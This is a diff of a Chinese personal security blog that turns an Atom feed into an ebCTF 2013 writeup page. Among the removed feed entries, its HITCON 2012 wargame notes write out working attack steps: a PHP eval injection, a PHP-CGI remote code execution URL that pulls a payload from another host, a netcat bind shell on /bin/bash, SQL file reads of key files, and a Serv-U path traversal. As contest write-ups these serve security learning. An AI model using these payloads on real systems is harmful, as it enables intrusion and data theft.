@@ -1,24 +1,131 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[blog.dm4.tw]]></title>
-  <link href="http://blog.dm4.tw/atom.xml" rel="self"/>
-  <link href="http://blog.dm4.tw/"/>
-  <updated>2013-11-08T21:59:16+08:00</updated>
-  <id>http://blog.dm4.tw/</id>
-  <author>
-    <name><![CDATA[dm4]]></name>
-    
-  </author>
-  <generator uri="http://octopress.org/">Octopress</generator>
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>ebCTF 2013 Writeup - blog.dm4.tw</title>
+  <meta name="author" content="dm4">
 
   
-  <entry>
-    <title type="html"><![CDATA[ebCTF 2013 Writeup]]></title>
-    <link href="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/"/>
-    <updated>2013-11-08T20:56:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup</id>
-    <content type="html"><![CDATA[<p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>
+  <meta name="description" content="拖超久的 writeup ，感謝一起玩的 217 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup BIN100 擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。 Reference http://balidani. &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blog.dm4.tw" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<!-- Social media content metadata -->
+
+<meta property="fb:admins" content="1360542987" />
+<meta property="og:title" content="ebCTF 2013 Writeup" />
+<meta property="og:site_name" content="blog.dm4.tw" />
+<meta property="og:url" content="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/" />
+<meta property="og:description" content="拖超久的 writeup ，感謝一起玩的 217 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup BIN100 擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。 Reference http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html &hellip;" />
+<meta property="og:author" content="https://www.facebook.com/sunrisedm4" />
+
+
+
+<meta property="twitter:card" content="summary" />
+<meta property="twitter:site" content="dm4" />
+<meta property="twitter:url" content="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup" />
+<meta property="twitter:title" content="ebCTF 2013 Writeup" />
+<meta property="twitter:description" content="拖超久的 writeup ，感謝一起玩的 217 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup BIN100 擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。 Reference http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html &hellip;" />
+<meta property="twitter:creator" content="dm4" />
+
+
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-31586582-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blog.dm4.tw</a></h1>
+  
+    <h2>dm4's blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:blog.dm4.tw" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">ebCTF 2013 Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-11-08T20:56:00+08:00" pubdate data-updated="true">Nov 8<span>th</span>, 2013</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://blog.dm4.tw">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>拖超久的 writeup ，感謝一起玩的 <a href="http://ctftime.org/team/5160">217</a> 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup</p>
 
 <h2>BIN100</h2>
 
@@ -606,414 +713,213 @@ echo urlencode(base64_encode($b))."\n";
 <li><a href="http://hardc0de.ctf.su/archives/43">http://hardc0de.ctf.su/archives/43</a></li>
 </ul>
 
-]]></content>
-  </entry>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
   
-  <entry>
-    <title type="html"><![CDATA[用 xxd 解 Hex String]]></title>
-    <link href="http://blog.dm4.tw/blog/2013/11/08/yong-xxd-jie-hex-string/"/>
-    <updated>2013-11-08T13:57:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2013/11/08/yong-xxd-jie-hex-string</id>
-    <content type="html"><![CDATA[<p>本來解 hex string 都是用有點醜的 perl one-liner</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ perl -ne 'print map chr hex, m/../g' &lt;&lt;&lt; 646d340a
-</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>
+<span class="byline author vcard">Posted by <span class="fn">dm4</span></span>
+
+      
 
 
-<p>不過昨天又研究了一下 <code>xxd</code> 發現一些神秘的功能，像是發現有 C style 的 output ！</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i data
-</span><span class='line'>unsigned char data[] = {
-</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x62, 0x69, 0x61, 0x6e,
-</span><span class='line'>  0x72, 0x79, 0x3f, 0x0a
-</span><span class='line'>};
-</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>
 
 
-<p>還可以調 column 數</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -i -c 8 data
-</span><span class='line'>unsigned char data[] = {
-</span><span class='line'>  0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20,
-</span><span class='line'>  0x62, 0x69, 0x61, 0x6e, 0x72, 0x79, 0x3f, 0x0a
-</span><span class='line'>};
-</span><span class='line'>unsigned int data_len = 16;</span></code></pre></td></tr></table></div></figure>
 
 
-<p>然後 <a href="http://blog.atdog.org">atdog</a> 大大看到之後，又教了我怎麼用 <code>xxd</code> 解 hex string</p>
-
-<ul>
-<li>生 hex string</li>
-</ul>
 
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p &lt;&lt;&lt; dm4
-</span><span class='line'>646d340a</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>解 hex string</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ xxd -p -r &lt;&lt;&lt; 646d340a
-</span><span class='line'>dm4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>太帥了！而且比原本 perl one-liner 短好多啊啊啊</p>
-]]></content>
-  </entry>
   
-  <entry>
-    <title type="html"><![CDATA[dns-sd &amp; AirPlay / AirTunes]]></title>
-    <link href="http://blog.dm4.tw/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/"/>
-    <updated>2013-11-08T11:59:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes</id>
-    <content type="html"><![CDATA[<h2>Usage</h2>
-
-<pre><code>$ dns-sd
-dns-sd -E                  (Enumerate recommended registration domains)
-dns-sd -F                      (Enumerate recommended browsing domains)
-dns-sd -R &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; [&lt;TXT&gt;...] (Register a service)
-dns-sd -B        &lt;Type&gt; &lt;Domain&gt;        (Browse for services instances)
-dns-sd -L &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt;           (Look up a service instance)
-dns-sd -P &lt;Name&gt; &lt;Type&gt; &lt;Domain&gt; &lt;Port&gt; &lt;Host&gt; &lt;IP&gt; [&lt;TXT&gt;...]  (Proxy)
-dns-sd -q &lt;name&gt; &lt;rrtype&gt; &lt;rrclass&gt; (Generic query for any record type)
-dns-sd -Z        &lt;Type&gt; &lt;Domain&gt;   (Output results in Zone File format)
-dns-sd -G     v4/v6/v4v6 &lt;name&gt;  (Get address information for hostname)
-dns-sd -V    (Get version of currently running daemon / system service)
-</code></pre>
-
-<h2>Type</h2>
-
-<ul>
-<li>AirTunes 是 <code>_raop._tcp.</code></li>
-<li>AirPlay 是 <code>_airplay._tcp.</code></li>
-</ul>
 
 
-<h2>Browse &amp; Look up</h2>
+<time datetime="2013-11-08T20:56:00+08:00" pubdate data-updated="true">Nov 8<span>th</span>, 2013</time>
+      
 
-<pre><code>$ dns-sd -B _raop._tcp
-Browsing for _raop._tcp
-Timestamp     A/R Flags if Domain                    Service Type              Instance Name
-17:05:13.971  Add     3  8 local.                    _raop._tcp.               C92A14084F64@Hello
-
-$ dns-sd -L "C92A14084F64@Hello" _raop._tcp.
-Lookup C92A14084F64@Hello._raop._tcp..local
-17:11:26.993  C92A14084F64@Hello._raop._tcp.local. can be reached at Hello.local.:50391 (interface 8) Flags: 1
- et=0,3,5 cn=1,2,3 da=true sf=0x4 tp=UDP vv=1 pw=false am=AppleTV3,1 txtvers=1 vn=65537 md=0,1,2 vs=150.33 sv=false ch=2 sr=44100 rhd=4.6.5 ss=16
-</code></pre>
-]]></content>
-  </entry>
+<span class="categories">
   
-  <entry>
-    <title type="html"><![CDATA[Command Line 小知識]]></title>
-    <link href="http://blog.dm4.tw/blog/2013/01/27/command-line-xiao-zhi-shi/"/>
-    <updated>2013-01-27T22:35:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2013/01/27/command-line-xiao-zhi-shi</id>
-    <content type="html"><![CDATA[<p>前幾天看了這篇 <a href="http://geekblog.oneandoneis2.org/index.php/2012/09/30/to-understand-the-command-line">To understand the command line&hellip;</a> 覺得蠻有趣的，大概是在說：</p>
-
-<ul>
-<li><code>awk</code>: 作者名字的縮寫</li>
-<li><code>cat</code>: concatenate</li>
-<li><code>more</code>: 螢幕最下面會顯示 &ldquo;More&rdquo;</li>
-<li><code>less</code>: more 的加強版，因為 &ldquo;less is more&rdquo; 所以叫 less</li>
-<li><code>ed</code>: editor</li>
-<li><code>sed</code>: stream editor</li>
-<li><code>grep</code>: 在 <code>ed</code> 裡要找有包含特定字串的行並印出，本來是要用 <code>g/regular expression/p</code> ，簡寫成 <code>g/re/p</code> 就變成 <code>grep</code> 了</li>
-<li>hjkl 方向鍵是因為 <a href="http://www.catonmat.net/blog/why-vim-uses-hjkl-as-arrow-keys/">ADM-3A</a></li>
-<li><code>~</code> 代表 HOME 也是因為 <a href="http://www.catonmat.net/blog/why-vim-uses-hjkl-as-arrow-keys/">ADM-3A</a></li>
-<li><code>.</code> 開頭的檔案是隱藏檔，本來只是要跳過 <code>.</code> 和 <code>..</code> ，結果寫出有 bug 的 <code>if (name[0] == '.') continue;</code></li>
-</ul>
-
-]]></content>
-  </entry>
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/wargame/'>wargame</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
   
-  <entry>
-    <title type="html"><![CDATA[HITCON 2012 Wargame Notes - Part 2]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2/"/>
-    <updated>2012-07-26T14:21:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/07/26/hitcon-2012-wargame-notes-part-2</id>
-    <content type="html"><![CDATA[<h3>Web 5</h3>
+</span>
 
-<p>結果回家研究了一下，終於把 Web 5 也解出來了！好後悔在 HITCON 花太多時間在看
-<a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a> 啊啊啊 orz</p>
 
-<p>這題的 <a href="http://www.exploit-db.com/wp-content/themes/exploit/docs/19527.pdf">提示二</a>
-出來之後，可以發現長檔名的檔案/資料夾會因為 <code>~</code> 的縮寫而 disclosure ，所以可以寫個
-<a href="https://gist.github.com/3180618">script</a> 來踹，或是用 hint 裡有提到的 <a href="http://code.google.com/p/iis-shortname-scanner-poc/">iis-shortname-scanner-poc</a></p>
-
-<p>不過試了之後發現 file disclosure 只限於有 <code>~</code> 的長檔名，
-如果只是 6, 7 個字的檔案/資料夾是不會被套用縮寫的規則，所以也就踹不出來，
-在 HITCON 的時候我們就是卡在這裡。</p>
-
-<p>回家再查了多一點資料的時候，看到更多有關 <a href="http://scilnet.fortlewis.edu/tech/NT-Server/File_Names.htm">8.3 Filename</a>
-的介紹，其中提到：</p>
-
-<blockquote><p>To disable short filename support, use the registration database editor, REGEDT32.EXE,
-and search the HKEY_LOCAL_MACHINE section for the entry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\FileSystem.
-Change the value of the parameter NtfsDisable8dot3NameCreation to a value of 1 (one),
-and then short filename generation will be disabled.</p></blockquote>
-
-<p>所以就想到去試一下 <a href="http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt">http://wg2.hack.idv.tw:2012/HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/FileSystem/NtfsDisable8dot3NameCreation/key.txt</a>
-沒想到就&hellip;&hellip; orz</p>
-]]></content>
-  </entry>
+    </p>
+    
+      <div class="sharing">
   
-  <entry>
-    <title type="html"><![CDATA[Firefox HackBar Font Setting on Mac OSX]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx/"/>
-    <updated>2012-07-24T20:32:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx</id>
-    <content type="html"><![CDATA[<p>聽說 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 是 Firefox 下很好用的 extension ，
-不過在 Mac OSX 下的字型實在是&hellip;&hellip;慘不忍賭，所以找了一下設定檔在哪裡，Firefox extension 在 Mac OSX 下的路徑是：</p>
-
-<pre><code>~/Library/Application Support/Firefox/Profiles/xxxxxxxx.default/extensions/{F5DDF39C-9293-4d5e-9AA8-E04E6DD5E9B4}.xpi
-</code></pre>
-
-<p>其中 <code>xxxxxxxx.default</code> 可能要自己找一下，找到 <code>.xpi</code> 之後可以直接用 <code>vim</code> 來改裡面的檔（.xpi 就是一包 .zip），找到
-<code>chrome/skin/hackbar.css</code> 把 textbox 的部份加上想要的字型和大小：</p>
-
-<pre><code>textbox#hackBarTargetUrl,
-textbox#hackBarTargetUrlPostField,
-textbox#hackBarTargetUrlReferrerField { font-family: monaco, monospace, courier; font-size: 16px; }
-</code></pre>
-
-<p>就有舒服的 <a href="https://addons.mozilla.org/en-us/firefox/addon/hackbar/">HackBar</a> 可以看了~</p>
-
-<p><a href="http://www.flickr.com/photos/51077287@N06/7636698076/" title="Flickr 上 sunrisedm4 的 hackbar-font-setting"><img src="http://farm8.staticflickr.com/7248/7636698076_ccf7da7915.jpg" width="500" height="318" alt="hackbar-font-setting"></a></p>
-
-<p>如果想要自己改 source 話，也可以到 <a href="http://code.google.com/p/hackbar/">HackBar Firefox Extension</a> 來載 source code</p>
-]]></content>
-  </entry>
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/" data-via="dm4" data-counturl="http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/" >Tweet</a>
   
-  <entry>
-    <title type="html"><![CDATA[HITCON 2012 Wargame Notes]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes/"/>
-    <updated>2012-07-22T11:27:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/07/22/hitcon-2012-wargame-notes</id>
-    <content type="html"><![CDATA[<p>今年是第二年來 HITCON ，去年感謝 atdog 大大帶我一起報名 HITCON 玩 wargame ，
-本來想說和去年一樣解解 QR code 我就很開心了，沒想到今年運氣不錯 XD</p>
-
-<p>感謝同隊 crax 的組員： atdog xman jeffxx cyen hliu kvchung</p>
-
-<p>Wargame 題目有大大幫忙備分了：<a href="http://rsghost.org/backup/wargame.hitcon.org/">HITCON 2012 Wargame</a></p>
-
-<h2>Wargame 心得</h2>
-
-<p>這次因為運氣好，所以有幾題 web 都用爛招解掉了 XD
-用和 hint 沒關係的解法繞掉其實解的有點心虛，下面是今年我有幫到一些忙的題目：</p>
-
-<h3>Web 1</h3>
-
-<p>主要就是利用 <code>{${fucntion()}}</code> 來直接執行 php function ，本來想用 <code>file_get_contents()</code> 來讀 <code>key.php</code> 發現被擋掉了，
-所以就試著用 <code>include()</code> 再用 <code>get_defined_vars()</code> 和 <code>var_dump()</code> 看有沒有設什麼變數，還好 <code>key.php</code> 是把 key 放在變數裡，
-不然的話就要用其他方法去看 source 了。</p>
-
-<pre><code>http://wg.hack.idv.tw/~ow100/orange.php?name=dm4&amp;data={${include($_GET[key])}}{${var_dump(get_defined_vars())}}
-http://wg.hack.idv.tw/~ow100/yourfiles/dm4.config.php?key=../key.php
-</code></pre>
-
-<h3>Web 2</h3>
-
-<p>利用 Web 3 給的 <code>sqln00b/sqln00b</code> 可以登入 phpMyAdmin ，接著把 <code>key.php</code> LOAD 到任何一個 table 就可以了：</p>
-
-<pre><code>CREATE TABLE web2 (src TEXT);
-LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
-</code></pre>
-
-<h3>Web 4</h3>
-
-<p>從 <code>info.php</code> 發現 <code>Server API: CGI</code> 想到應該是在說今年的 <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">PHP CGI vulnerability</a>
-，這東西今年出來的時候有看一下，不過其實還是在解題的時候才真的看懂 XD</p>
-
-<p>在 <code>htaccess.txt</code> 裡可以看到</p>
-
-<pre><code>RewriteCond %{QUERY_STRING} \-|\-d[a-z_]+%3d|%2d[a-z_]+%3d [NC]
-</code></pre>
-
-<p>發現 <code>%2d</code> 擋的比較鬆，所以研究了一下可以用</p>
-
-<pre><code>http://wg.hack.idv.tw/~w100/info.php?%2dd+allow_url_include%3dOn+%2dd+auto_prepend_file%3dhttp://myhost/a.txt
-</code></pre>
-
-<p>來做 remote code execution ，試了一下就可以發現要找的東西在 <code>../key.txt</code> ，所以在 <code>a.txt</code> 這樣寫就可以讓它噴 key 了：</p>
-
-<pre><code>&lt;?php
-    system('cat ../key.txt');
-    exit();
-?&gt;
-</code></pre>
-
-<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&hellip;&hellip;</p>
-
-<pre><code>&lt;?php
-    system('nc -l -p 5566 -e /bin/bash');
-    exit();
-?&gt;
-</code></pre>
-
-<p>然後&hellip;&hellip;</p>
-
-<pre><code>[~] $ nc wg.hack.idv.tw 5566
-id
-uid=1002(w100) gid=33(www-data) groups=1002(w100),33(www-data)
-</code></pre>
-
-<h3>Web 3</h3>
-
-<p>這題看 hint 應該是要用 mysql client 的 <code>system</code> 來解，不過我們利用 Web 4 拿到的 back connect shell
-可以發現要找的東西是 <code>/home/my100/key.txt</code> ，所以一樣用：</p>
-
-<pre><code>CREATE TABLE web3 (src TEXT);
-LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
-</code></pre>
-
-<p>就可以在 Web 2 的 phpMyAdmin 看到 key 囉~</p>
-
-<h3>Web 6</h3>
-
-<p>也是用爛招&hellip;&hellip; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
-裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>
-
-<h3>Potent Pwnables 2</h3>
-
-<p><code>nmap</code> 完之後發現有開 ftp ，查了一下發現有 <a href="http://www.exploit-db.com/exploits/18182/">Serv-U FTP Jail Break</a>
-和 hint 一模一樣應該就是它了吧 XD 不過那時候肚子太餓又找不到怎麼登入 ftp ，把連結跟 atdog 說了之後我就出去吃點心，
-回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>
-
-<p>關鍵是 <code>Plz Input "Your" Real ID:</code> 要用 <code>wargame.hitcon.org</code> 的帳號去 generate key.txt 接下來就：</p>
-
-<pre><code>[~] ➟  ftp jumpochisun.blogsyte.com
-Connected to jumpochisun.blogsyte.com.
-220 Serv-U FTP Server v6.4 for WinSock ready...
-Name (jumpochisun.blogsyte.com:dm4): hitcon2012
-331 User name okay, need password.
-Password: 
-230 User logged in, proceed.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; get ..:/..:/..:/..:/key/dm4key.txt key.txt
-local: key.txt remote: ..:/..:/..:/..:/key/dm4key.txt
-227 Entering Passive Mode (114,36,241,246,15,231)
-150 Opening BINARY mode data connection for dm4key.txt (28 Bytes).
-100% |**************************************************|    28      179.89 KiB/s    00:00 ETA
-226 Transfer complete.
-28 bytes received in 00:00 (0.80 KiB/s)
-</code></pre>
-
-<p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
-不過看到結束還是沒找到應該怎麼解&hellip;&hellip;</p>
-
-<p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>
-
-<p>爽啊！</p>
-
-<p><a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a></p>
-]]></content>
-  </entry>
   
-  <entry>
-    <title type="html"><![CDATA[.bashrc sourced twice]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice/"/>
-    <updated>2012-05-11T21:08:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice</id>
-    <content type="html"><![CDATA[<p>昨天解決了困擾了一陣子的問題，在 <code>.bashrc</code> 裡，如果有改到 <code>$PATH</code> ：</p>
-
-<pre><code>export PATH=~/bin:$PATH
-</code></pre>
-
-<p>又因為我會用到 <a href="http://tmux.sourceforge.net/">tmux</a> ，所以在 <code>tmux</code> 裡開新的 shell 時，會再 source 一次 <code>.bashrc</code> ，本來我的解法是這樣：</p>
-
-<pre><code>[ -z "$TMUX" ] &amp;&amp; export PATH=~/bin:$PATH
-</code></pre>
-
-<p>也就是在 <code>tmux</code> 裡新開啟的 shell 並不會再改一次 <code>$PATH</code> ，可是這樣又遇到了另一個問題：當新的 shell 打開時，本來應該被加在前面的 <code>~/bin</code> 會被接到後面去，我在想應該是開新 shell 時 bash 自己做的處理，我在 <code>/etc/bashrc</code> 裡也沒有看到相關的 script 。</p>
-
-<p>對於這個問題我最後的解法是參考 <a href="http://perlbrew.pl/">perlbrew</a> 裡的這段 script ：</p>
-
-<pre><code>export PATH_WITHOUT_PERLBREW="$(perl -e 'print join ":", grep { index($_, $ENV{PERLBREW_ROOT}) } split/:/,$ENV{PATH};')"
-
-if [[ -z "$PERLBREW_PATH" ]]; then
-    export PERLBREW_PATH="$PERLBREW_ROOT/bin"
-fi
-
-export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
-</code></pre>
-
-<p>最後的結果：</p>
-
-<pre><code>export PATH="~/bin:$(perl -e 'print join ":", grep { $_ ne "~/bin" } split/:/, $ENV{PATH};')"
-</code></pre>
-
-<p><strong>Update</strong> 2012-05-13</p>
-
-<p>為了避免 <code>~/bin</code> 和 <code>$HOME/bin</code> 混用，所以改了一下 script</p>
-
-<pre><code>export PATH=$HOME/bin:"$(perl -e 'print join ":", grep { $_ ne "$ENV{HOME}/bin" &amp;&amp; $_ ne "~/bin" } split/:/, $ENV{PATH};')"
-</code></pre>
-]]></content>
-  </entry>
   
-  <entry>
-    <title type="html"><![CDATA[[ and [[ in shell script]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script/"/>
-    <updated>2012-05-10T17:01:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script</id>
-    <content type="html"><![CDATA[<p>終於搞懂在 shell script 裡 <code>[ ... ]</code> 和 <code>[[ ... ]]</code> 的差別了</p>
-
-<pre><code>$ help [
-[: [ arg... ]
-    This is a synonym for the "test" builtin, but the last
-    argument must be a literal `]', to match the opening `['.
-[[ ... ]]: [[ expression ]]
-    Returns a status of 0 or 1 depending on the evaluation of the conditional
-    expression EXPRESSION.  Expressions are composed of the same primaries used
-    by the `test' builtin, and may be combined using the following operators
-
-        ( EXPRESSION )  Returns the value of EXPRESSION
-        ! EXPRESSION    True if EXPRESSION is false; else false
-        EXPR1 &amp;&amp; EXPR2  True if both EXPR1 and EXPR2 are true; else false
-        EXPR1 || EXPR2  True if either EXPR1 or EXPR2 is true; else false
-
-    When the `==' and `!=' operators are used, the string to the right of the
-    operator is used as a pattern and pattern matching is performed.  The
-    &amp;&amp; and || operators do not evaluate EXPR2 if EXPR1 is sufficient to
-    determine the expression's value.
-</code></pre>
-
-<p>簡單的說就是要用 <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, <code>()</code> 的話要用 <code>[[ ... ]]</code></p>
-]]></content>
-  </entry>
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
   
-  <entry>
-    <title type="html"><![CDATA[First Post]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/08/first-post/"/>
-    <updated>2012-05-08T00:27:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/08/first-post</id>
-    <content type="html"><![CDATA[<p>聽說很潮來用一下傳說中的 octopress</p>
+</div>
 
-<p>本來覺得不會 ruby 怕怕的，可是還是忍不住想試試看用 <a href="http://markdown.tw">Markdown</a> 寫 blog 的感覺，一試之下才發現……也太方便了吧！</p>
-]]></content>
-  </entry>
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/11/08/yong-xxd-jie-hex-string/" title="Previous Post: 用 xxd 解 Hex String">&laquo; 用 xxd 解 Hex String</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
   
-</feed>
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/11/08/ebctf-2013-writeup/">ebCTF 2013 Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/08/yong-xxd-jie-hex-string/">用 Xxd 解 Hex String</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/08/dns-sd-and-airplay-slash-airtunes/">Dns-sd &amp; AirPlay / AirTunes</a>
+      </li>
+    
